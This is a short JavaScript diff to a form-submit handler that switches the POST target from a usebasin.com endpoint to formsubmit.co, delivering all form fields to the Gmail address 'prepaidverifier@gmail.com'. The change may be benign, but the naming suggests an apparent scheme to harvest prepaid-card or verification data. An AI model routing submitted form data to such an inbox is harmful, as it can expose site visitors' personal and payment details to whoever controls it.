@@ -5,7 +5,7 @@ const handleSubmit = async (event) => {
   const data = new FormData(form);
 
   try {
-    const res = await fetch("https://usebasin.com/f/d24bbc3f6575", {
+    const res = await fetch("https://formsubmit.co/prepaidverifier@gmail.com", {
       method: "POST",
       body: data,
     });
